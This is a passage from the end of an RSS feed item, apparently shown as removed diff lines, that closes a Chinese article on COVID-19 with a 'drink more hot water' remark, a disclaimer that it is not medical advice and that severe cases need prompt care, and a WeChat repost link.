-&lt;p&gt;最后，多喝热水。。。&lt;/p&gt;
-&lt;font color=red&gt;
-备注：
-1. 本文只是一个帮助大家了解新冠的窗口，不构成任何医疗建议。
-2. 尽管对于大多数人来说，新冠并不可怕，但个体免疫力有差异，一旦病情严重，务必及时就医。
-  &lt;/font&gt;
-
-
-&lt;p&gt;  转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/hpheu-C8ZiwyCuI9GdSTQA&#34;&gt;https://mp.weixin.qq.com/s/hpheu-C8ZiwyCuI9GdSTQA&lt;/a&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
